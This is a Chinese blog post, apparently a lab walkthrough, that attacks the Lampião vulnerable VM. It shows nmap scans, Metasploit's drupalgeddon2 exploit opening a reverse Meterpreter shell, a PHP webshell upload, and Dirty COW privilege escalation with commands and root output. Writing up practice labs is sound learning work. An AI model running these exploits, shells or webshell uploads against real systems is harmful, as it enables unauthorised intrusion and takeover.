@@ -1,0 +1,1054 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.1',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="靶机渗透记录—Lampiao下载地址https://www.vulnhub.com/entry/dc-1,249/ 靶机描述1234567891011121314151617181920Would you like to keep hacking in your own lab?Try this brand new vulnerable machine! &amp;quot;Lampião 1&amp;quot;">
+<meta name="keywords" content="渗透测试,靶机渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="靶机渗透记录—Lampiao">
+<meta property="og:url" content="http://yoursite.com/2020/05/26/靶机渗透记录—Lampiao/index.html">
+<meta property="og:site_name" content="张灵灵的笔记">
+<meta property="og:description" content="靶机渗透记录—Lampiao下载地址https://www.vulnhub.com/entry/dc-1,249/ 靶机描述1234567891011121314151617181920Would you like to keep hacking in your own lab?Try this brand new vulnerable machine! &amp;quot;Lampião 1&amp;quot;">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://images.5666888.xyz//20200424093949.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200424094425.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200424094440.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200424095557.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200424100132.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200424100459.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200424101226.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200424101421.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200424102941.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200424103754.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200424103944.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200424104216.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200424110325.png">
+<meta property="og:image" content="http://images.5666888.xyz//20200424111254.png">
+<meta property="og:updated_time" content="2020-05-26T02:35:46.305Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="靶机渗透记录—Lampiao">
+<meta name="twitter:description" content="靶机渗透记录—Lampiao下载地址https://www.vulnhub.com/entry/dc-1,249/ 靶机描述1234567891011121314151617181920Would you like to keep hacking in your own lab?Try this brand new vulnerable machine! &amp;quot;Lampião 1&amp;quot;">
+<meta name="twitter:image" content="http://images.5666888.xyz//20200424093949.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://yoursite.com/2020/05/26/靶机渗透记录—Lampiao/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>靶机渗透记录—Lampiao | 张灵灵的笔记</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">张灵灵的笔记</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tools">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tools/" rel="section"><i class="menu-item-icon fa fa-fw fa-users"></i> <br>tools</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/26/靶机渗透记录—Lampiao/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content>
+      <meta itemprop="description" content="夏天,那个夏天,还有那个夏天,即使经历无数次夏天,我还是说不出口。">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="张灵灵的笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">靶机渗透记录—Lampiao
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2020-05-26 10:35:00 / Modified: 10:35:46" itemprop="dateCreated datePublished" datetime="2020-05-26T10:35:00+08:00">2020-05-26</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/学习笔记/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="靶机渗透记录—Lampiao"><a href="#靶机渗透记录—Lampiao" class="headerlink" title="靶机渗透记录—Lampiao"></a>靶机渗透记录—Lampiao</h1><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p><a href="https://www.vulnhub.com/entry/dc-1,249/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/dc-1,249/</a></p>
+<h2 id="靶机描述"><a href="#靶机描述" class="headerlink" title="靶机描述"></a>靶机描述</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Would you like to keep hacking in your own lab?</span><br><span class="line"></span><br><span class="line">Try this brand new vulnerable machine! &quot;Lampião 1&quot;.</span><br><span class="line"></span><br><span class="line">Get root!</span><br><span class="line"></span><br><span class="line">Level: Easy</span><br><span class="line"></span><br><span class="line">翻译：</span><br><span class="line"></span><br><span class="line">你想在自己的实验室里继续黑客攻击吗？</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">试试这个全新的易受攻击的机器！”Lampião 1”。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">获得root权限</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">级别：简单</span><br></pre></td></tr></table></figure>
+<h2 id="打开靶机"><a href="#打开靶机" class="headerlink" title="打开靶机"></a>打开靶机</h2><p><img src="http://images.5666888.xyz//20200424093949.png" alt></p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>然后切换到攻击机 先去做信息搜集 扫描一下同网段内存活的主机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP -n 192.168.191.0/24</span><br></pre></td></tr></table></figure>
+<p>扫到了一个<code>192.168.191.133</code></p>
+<p>探测一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV -Pn -n  -A 192.168.191.133</span><br></pre></td></tr></table></figure>
+<p><img src="http://images.5666888.xyz//20200424094425.png" alt></p>
+<p><img src="http://images.5666888.xyz//20200424094440.png" alt></p>
+<p>探测到了22 80 端口  这次的靶机端口太少  不太科学</p>
+<p>全端口再扫描一下</p>
+<figure class="highlight plain"><figcaption><span>-sS -sV -Pn -n  -A 192.168.191.133</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV -Pn -n  -A  -p- 192.168.191.133</span><br></pre></td></tr></table></figure>
+<p>又出现了一个1989端口 也是个web服务</p>
+<p><img src="http://images.5666888.xyz//20200424095557.png" alt></p>
+<p>80端口 扫描了下目录什么东西也没有</p>
+<p><img src="http://images.5666888.xyz//20200424100132.png" alt></p>
+<p>先去1898端口看看</p>
+<p><img src="http://images.5666888.xyz//20200424100459.png" alt></p>
+<p>  又是一个 Drupal cms 的网站</p>
+<p>访问   /CHANGELOG.txt 可以查看版本</p>
+<p><img src="http://images.5666888.xyz//20200424101226.png" alt></p>
+<h2 id="Msf-Getshell"><a href="#Msf-Getshell" class="headerlink" title="Msf Getshell"></a>Msf Getshell</h2><p>果断开启msf </p>
+<p><code>search  drupal</code></p>
+<p>用影响到7.X的CVE-2018-7600</p>
+<p><img src="http://images.5666888.xyz//20200424101421.png" alt></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rhosts 192.168.191.133</span><br><span class="line">rhosts =&gt; 192.168.191.133</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rport 1898</span><br><span class="line">rport =&gt; 1898</span><br><span class="line">msf5 exploit(unix/webapp/drupal_drupalgeddon2) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.191.128:4444 </span><br><span class="line">[*] Sending stage (38288 bytes) to 192.168.191.133</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.191.128:4444 -&gt; 192.168.191.133:41308) at 2020-04-24 10:26:58 +0800</span><br></pre></td></tr></table></figure>
+<p>返回了session </p>
+<h3 id="在msf的shell里获取一个交互式shell"><a href="#在msf的shell里获取一个交互式shell" class="headerlink" title="在msf的shell里获取一个交互式shell"></a>在msf的shell里获取一个交互式shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;</span><br></pre></td></tr></table></figure>
+<p><img src="http://images.5666888.xyz//20200424102941.png" alt></p>
+<p>依然是我的习惯 上一个大马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; pwd</span><br><span class="line">/var/www/html</span><br><span class="line">meterpreter &gt; upload /home/x.php /var/www/html/x.php</span><br><span class="line">[*] uploading  : /home/x.php -&gt; /var/www/html/x.php</span><br><span class="line">[*] Uploaded -1.00 B of 85.50 KiB (-0.0%): /home/x.php -&gt; /var/www/html/x.php</span><br><span class="line">[*] uploaded   : /home/x.php -&gt; /var/www/html/x.php</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+<h2 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h2><p>然后直接在大马里上传攻击探测工具</p>
+<p>一开始上传到了网站根目录 也就是/var/www/html/下面  在赋予执行权限的时候操作失败 可能是权限原因</p>
+<p><img src="http://images.5666888.xyz//20200424103754.png" alt></p>
+<p>于是又上传了一个到/tmp目录下 赋予执行权限然后执行</p>
+<p><img src="http://images.5666888.xyz//20200424103944.png" alt></p>
+<p>攻击建议里有脏牛 那就果断先用脏牛试一下</p>
+<p>poc下载:<a href="https://github.com/FireFart/dirtycow" target="_blank" rel="noopener">https://github.com/FireFart/dirtycow</a></p>
+<p>下载exp 然后编译一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br></pre></td></tr></table></figure>
+<p><img src="http://images.5666888.xyz//20200424104216.png" alt></p>
+<p>然后把编译完的exp上传到靶机/tmp目录下</p>
+<p>然后赋予执行权限<code>chmod +x dirty</code></p>
+<p>然后执行 ./dirty + 密码</p>
+<p><img src="http://images.5666888.xyz//20200424110325.png" alt></p>
+<p>报错了 百度之后知道了是编译环境不同引起的：<a href="https://blog.51cto.com/1381479/888198" target="_blank" rel="noopener">https://blog.51cto.com/1381479/888198</a></p>
+<p>于是就直接把c文件上传到靶机 在靶机里编译</p>
+<p>编译完成执行 但是提权不成功</p>
+<p> 所以打算换一个exp</p>
+<p><code>searchsploit dirty</code></p>
+<p><img src="http://images.5666888.xyz//20200424111254.png" alt>用这刚才用c文件编译之后提权没成功</p>
+<p>这次用这个cpp文件</p>
+<p><code>Linux Kernel 2.6.22 &lt; 3.9 - &#39;Dirty COW | exploits/linux/local/40847.cpp</code></p>
+<p>把源文件拷贝到home下 </p>
+<p><code>cp /usr/share/exploitdb/exploits/linux/local/40847.cpp  /home</code></p>
+<p>然后在msf里 把cpp文件上传到靶机 </p>
+<p><code>upload /home/40847.cpp /tmp/40847.cpp</code></p>
+<h3 id="查看如何使用exp"><a href="#查看如何使用exp" class="headerlink" title="查看如何使用exp"></a>查看如何使用exp</h3><p>根据这个exp的说明：<a href="http://www.vfocus.net/art/20161130/13161.html" target="_blank" rel="noopener">http://www.vfocus.net/art/20161130/13161.html</a></p>
+<p>在靶机里编译</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o exp 40847.cpp -lutil</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">参数解释：</span><br><span class="line">1. -Wall 一般使用该选项，允许发出GCC能够提供的所有有用的警告</span><br><span class="line">2. -pedantic 允许发出ANSI/ISO C标准所列出的所有警告</span><br><span class="line">3. -O2编译器的优化选项的4个级别，-O0表示没有优化,-O1为缺省值，-O3优化级别最高</span><br><span class="line">4. -std=c++11就是用按C++2011标准来编译的</span><br><span class="line">5. -pthread 在Linux中要用到多线程时，需要链接pthread库</span><br><span class="line">6. -o exp gcc生成的目标文件,名字为exp</span><br></pre></td></tr></table></figure>
+<p>执行exp文件 <code>./exp -s</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">www-data@lampiao:/tmp$ ./exp -s</span><br><span class="line">./exp -s</span><br><span class="line">Running ...</span><br><span class="line">Password overridden to: dirtyCowFun</span><br><span class="line"></span><br><span class="line">Received su prompt (Password: )</span><br><span class="line"></span><br><span class="line">echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs</span><br><span class="line">cp /tmp/.ssh_bak /etc/passwd</span><br><span class="line">rm /tmp/.ssh_bak</span><br><span class="line">root@lampiao:~# echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs</span><br><span class="line">root@lampiao:~# cp /tmp/.ssh_bak /etc/passwd</span><br><span class="line">root@lampiao:~# rm /tmp/.ssh_bak</span><br><span class="line">root@lampiao:~# whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">root@lampiao:~# ls /root</span><br><span class="line">ls /root</span><br><span class="line">flag.txt</span><br><span class="line">root@lampiao:~# cat /root/flag.txt</span><br><span class="line">cat /root/flag.txt</span><br><span class="line">9740616875908d91ddcdaa8aea3af366</span><br></pre></td></tr></table></figure>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.由于环境的不同，不同的exp可能产生不同的情况</p>
+<p>2.如果权限允许，最好在靶机里完成编译工作</p>
+<p>3.不会用exp就百度</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透测试/" rel="tag"># 渗透测试</a>
+          
+            <a href="/tags/靶机渗透/" rel="tag"># 靶机渗透</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/05/26/靶机渗透记录—CH4INRULZ-v1-0-1/" rel="next" title="靶机渗透记录—CH4INRULZ_v1.0.1">
+                <i class="fa fa-chevron-left"></i> 靶机渗透记录—CH4INRULZ_v1.0.1
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/05/26/靶机渗透记录—DC-1/" rel="prev" title="靶机渗透记录—DC-1">
+                靶机渗透记录—DC-1 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80NzA3MC8yMzU3MA=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt>
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <div class="site-description motion-element" itemprop="description">夏天,那个夏天,还有那个夏天,即使经历无数次夏天,我还是说不出口。</div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">39</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">6</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">33</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友链
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.ak6666.top/" title="http://blog.ak6666.top/" rel="noopener" target="_blank">阿凯</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=536976917&auto=1&height=32"></iframe>
+
+
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#靶机渗透记录—Lampiao"><span class="nav-number">1.</span> <span class="nav-text">靶机渗透记录—Lampiao</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#下载地址"><span class="nav-number">1.1.</span> <span class="nav-text">下载地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#靶机描述"><span class="nav-number">1.2.</span> <span class="nav-text">靶机描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#打开靶机"><span class="nav-number">1.3.</span> <span class="nav-text">打开靶机</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#信息搜集"><span class="nav-number">1.4.</span> <span class="nav-text">信息搜集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Msf-Getshell"><span class="nav-number">1.5.</span> <span class="nav-text">Msf Getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#在msf的shell里获取一个交互式shell"><span class="nav-number">1.5.1.</span> <span class="nav-text">在msf的shell里获取一个交互式shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#脏牛提权"><span class="nav-number">1.6.</span> <span class="nav-text">脏牛提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#查看如何使用exp"><span class="nav-number">1.6.1.</span> <span class="nav-text">查看如何使用exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">1.7.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div> 
+   
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.1</div>
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<span id="busuanzi_container_site_pv">
+    <br>本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.1"></script>
+
+  <script src="/js/motion.js?v=7.1.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.1"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.1"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.1"></script>
+<script src="/js/post-details.js?v=7.1.1"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+    <script>
+  window.livereOptions = {
+    refer: '2020/05/26/靶机渗透记录—Lampiao/'
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+</script>
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
